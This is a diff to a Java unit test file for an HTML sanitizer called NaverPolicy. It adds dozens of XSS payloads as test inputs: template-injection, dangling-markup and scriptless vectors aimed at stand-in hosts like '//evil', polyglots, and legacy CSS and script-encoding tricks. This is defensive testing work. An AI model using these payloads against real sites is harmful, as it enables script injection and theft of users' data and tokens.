@@ -204,31 +204,26 @@ public class NaverPolicyTest2 extends TestCase {
 		cleanString = NaverPolicy.sanitize(attackString);
 		assertEquals("<a href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\">XSS via target in base tag</a>", cleanString);
 
-		// Set window.name via target attribute in a <a> tag
 		attackString = "<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in a tag</a>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		// todo check
 		assertEquals("<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\" rel=\"noopener noreferrer\">XSS via target in a tag</a>", cleanString);
 
-		// Set window.name via usemap attribute in a <img> tag
 		attackString = "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></map>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		// todo check
 		assertEquals("<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\" /><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context&#61;js_string_single&amp;x&#61;%27;eval%28name%29//\" /></map>", cleanString);
 
-		// Set window.name via target attribute in a <form> tag
 		attackString = "<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		// todo check
 		assertEquals("<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=\"hidden\" name=\"x\" value=\"&#39;;eval(name)//\" /><input type=\"hidden\" name=\"context\" value=\"js_string_single\" /><input type=\"submit\" value=\"XSS via target in a form\" /></form>", cleanString);
 
-		// Set window.name via formtarget attribute in a <input> tag type submit
 		attackString = "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		// todo check
 		assertEquals("<form><input type=\"hidden\" name=\"x\" value=\"&#39;;eval(name)//\" /><input type=\"hidden\" name=\"context\" value=\"js_string_single\" /><input type=\"submit\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\" /></form>", cleanString);
 
-		// Set window.name via formtarget attribute in a <input> tag type image
 		attackString = "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		// todo check
@@ -403,15 +398,337 @@ public class NaverPolicyTest2 extends TestCase {
 		attackString = "<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>";
 		cleanString = NaverPolicy.sanitize(attackString);
 		assertEquals("", cleanString);
-
-		// todo Client-side template injection
 	}
 
+	public void testClientSideTemplateInjection() {
+		String attackString = "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>";
+		String cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<div>a</div>", cleanString);
+
+		attackString = "<x v-html=_c.constructor('alert(1)')()>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<input autofocus=\"autofocus\" />", cleanString);
+
+		attackString = "<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<input id=\"x\" />", cleanString);
+
+		attackString = "<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<input autofocus=\"autofocus\" />", cleanString);
+
+		// todo check
+		attackString = "<div ng-app ng-csp><div ng-focus=\"x=$event;\" id=f tabindex=0>foo</div><div ng-repeat=\"(key, value) in x.view\"><div ng-if=\"key == 'window'\">{{ [1].reduce(value.alert, 1); }}</div></div></div>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<div><div id=\"f\" tabindex=\"0\">foo</div><div><div>{<!-- -->{ [1].reduce(value.alert, 1); }}</div></div></div>", cleanString);
+	}
+
+	public void testScriptlessAttacks() {
+		String attackString = "<body background=\"//evil?\n"
+				+ "<table background=\"//evil?\n"
+				+ "<table><thead background=\"//evil?\n"
+				+ "<table><tbody background=\"//evil?\n"
+				+ "<table><tfoot background=\"//evil?\n"
+				+ "<table><td background=\"//evil?\n"
+				+ "<table><th background=\"//evil?";
+		String cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<table><thead></thead><tfoot><table><tbody><tr><th></th></tr></tbody></table></tfoot></table>", cleanString);
+
+		attackString = "<link rel=stylesheet href=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<link rel=icon href=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<meta http-equiv=\"refresh\" content=\"0; http://evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<img src=\"//evil?\n"
+				+ "<image src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<img src=\"//evil?%0a&lt;image%20src&#61;\" />", cleanString);
+
+		// todo check
+		attackString = "<video><track default src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<video><track default=\"default\" src=\"&#34;//evil?\" /></video>", cleanString);
+
+		// todo check
+		attackString = "<video><source src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<video><source src=\"&#34;//evil?\" /></video>", cleanString);
+
+		// todo check
+		attackString = "<audio><source src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<audio><source src=\"&#34;//evil?\" /></audio>", cleanString);
+
+		// todo check
+		attackString = "<input type=image src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<input type=\"image\" src=\"&#34;//evil?\" />", cleanString);
+
+		attackString = "<form><button style=\"width:100%;height:100%\" type=submit formaction=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form><button style=\"width:100%;height:100%\" type=\"submit\"></button></form>", cleanString);
+
+		attackString = "<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form><input type=\"submit\" value=\"XSS\" style=\"width:100%;height:100%\" /></form>", cleanString);
+
+		attackString = "<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<button form=\"x\" style=\"width:100%;height:100%\"><form id=\"x\" action=\"&#34;//evil?\"></form></button>", cleanString);
+
+		attackString = "<isindex type=image src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<object data=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<iframe src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<embed src=\"//evil?";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<form><button formaction=//evil>XSS</button><textarea name=x>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form><button>XSS</button><textarea name=\"x\"></textarea></form>", cleanString);
+
+		attackString = "<button form=x>XSS</button><form id=x action=//evil target='";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<button form=\"x\">XSS</button><form id=\"x\" action=\"//evil\" target=\"\"></form>", cleanString);
+
+		attackString = "<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a href=\"http://subdomain1.portswigger-labs.net/dangling_markup/name.html\"><font size=\"100\" color=\"red\">You must click me</font></a>", cleanString);
+
+		attackString = "<form><input type=submit value=\"Click me\" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form><input type=\"submit\" value=\"Click me\" formtarget=\"\" /></form>", cleanString);
+
+		attackString = "<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a href=\"abc\">xss</a>", cleanString);
+
+		attackString = "<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		// todo check
+		attackString = "<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<frameset><frame src=\"http://subdomain1.portswigger-labs.net/dangling_markup/name.html\" name=\"\"></frame></frameset>", cleanString);
+	}
+
+	public void testPolyglots() {
+		String attackString = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>";
+		String cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("javascript:/*--&gt;", cleanString);
+
+		attackString = "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\"\n"
+				+ " onmouseover=/*&lt;svg/*/onload=alert()//>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("javascript:&#34;/*&#39;/*&#96;/*--&gt;<html></html>", cleanString);
+	}
+
+	public void testClassicVectors() {
+		String attackString = "<img src=\"javascript:alert(1)\">";
+		String cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<img />", cleanString);
+
+		attackString = "<body background=\"javascript:alert(1)\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<a href=\"vbscript:MsgBox+1\">XSS</a>\n"
+				+ "<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a>\n"
+				+ "<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a>\n"
+				+ "<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a>\n"
+				+ "<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a>\n"
+				+ "<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a>XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>", cleanString);
+
+		attackString = "<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a>\n"
+				+ "<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a href=\"#\">test</a>\n"
+				+ "<a href=\"#\">test</a>", cleanString);
+
+		attackString = "<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>\n"
+				+ "<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a href=\"#\">XSS</a>\n"
+				+ "<a href=\"#\">XSS</a>", cleanString);
+
+		attackString = "<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>\n"
+				+ "<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		// todo check
+		attackString = "<a title=\"&{alert(1)}\">XSS</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a title=\"&amp;{alert(1)}\">XSS</a>", cleanString);
+
+		attackString = "<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<form><button name=x formaction=x><b>stealme";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form><button name=\"x\"><b>stealme</b></button></form>", cleanString);
+
+		attackString = "<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<form action=\"x\"><button>XSS</button><select name=\"x\"><option>&lt;script&gt;token&#61;&#34;supersecret&#34;&lt;/script&gt;</option></select></form>", cleanString);
+
+		attackString = "<div style=\"-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n"
+				+ "<div style=\"\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\">\n"
+				+ "<div style=\"-moz-bindin\\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">\n"
+				+ "<div style=\"-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<div>\n"
+				+ "<div>\n"
+				+ "<div>\n"
+				+ "<div></div></div></div></div>", cleanString);
+
+		attackString = "<img src=\"blah\" style=\"-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)\" />";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<img src=\"blah\" />", cleanString);
+
+		attackString = "<div style=xss:expression(alert(1))>\n"
+				+ "<div style=xss:expression(1)-alert(1)>\n"
+				+ "<div style=xss:expressio\\6e(alert(1))>\n"
+				+ "<div style=xss:expressio\\006e(alert(1))>\n"
+				+ "<div style=xss:expressio\\00006e(alert(1))>\n"
+				+ "<div style=xss:expressio\\6e(alert(1))>\n"
+				+ "<div style=xss:expressio&#x5c;6e(alert(1))>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<div>\n"
+				+ "<div>\n"
+				+ "<div>\n"
+				+ "<div>\n"
+				+ "<div>\n"
+				+ "<div>\n"
+				+ "<div></div></div></div></div></div></div></div>", cleanString);
+
+		attackString = "<div style=xss=expression(alert(1))>\n"
+				+ "<div style=\"color&#x3dred\">test</div>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<div>\n"
+				+ "<div>test</div></div>", cleanString);
+
+		attackString = "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a>XSS</a>", cleanString);
+
+		attackString = "<script>\n"
+				+ "function window.onload(){\n"
+				+ "alert(1);\n"
+				+ "}\n"
+				+ "</script>\n"
+				+ "<script>\n"
+				+ "function window::onload(){\n"
+				+ "alert(1);\n"
+				+ "}\n"
+				+ "</script>\n"
+				+ "<script>\n"
+				+ "function window.location(){\n"
+				+ "}\n"
+				+ "</script>\n"
+				+ "<body>\n"
+				+ "<script>\n"
+				+ "function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}\n"
+				+ "</script>\n"
+				+ "</body>\n"
+				+ "<body>\n"
+				+ "<script>\n"
+				+ "function document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n"
+				+ "</script>\n"
+				+ "</body>";
+
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("\n"
+				+ "\n"
+				+ "\n"
+				+ "\n"
+				+ "\n"
+				+ "\n"
+				+ "\n"
+				+ "\n", cleanString);
+
+		attackString = "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<html> </html>", cleanString);
+
+		attackString = "<a href=\"javascript&#x6a;avascript:alert(1)\">Firefox</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a>Firefox</a>", cleanString);
+
+		attackString = "<a href=\"javascript&colon;alert(1)\">Firefox</a>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("<a>Firefox</a>", cleanString);
+
+		attackString = "<!-- ><img title=\"--><iframe/onload=alert(1)>\"> -->\n"
+				+ "<!-- ><img title=\"--><iframe/onload=alert(1)>\"> -->";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+		attackString = "<svg><xss onload=alert(1)>";
+		cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
+
+
+	}
+
+	// todo logic check
 	public void testconfirmLogic() {
-		// todo logic
 		String attackString = "<a href=\"&#x6a;avascript:alert(1)\">XSS</a>";
 		String cleanString = NaverPolicy.sanitize(attackString);
 		assertEquals("<a>XSS</a>", cleanString);
+	}
+
+	public void testBaseLogic() {
+//		String attackString = "<a href=\"//evil/\"";
+//		String attackString = "<base href=\"//evil/\"";
+		String attackString = "<area href=\"//evil/\"";
+		String cleanString = NaverPolicy.sanitize(attackString);
+		assertEquals("", cleanString);
 
 	}
 }
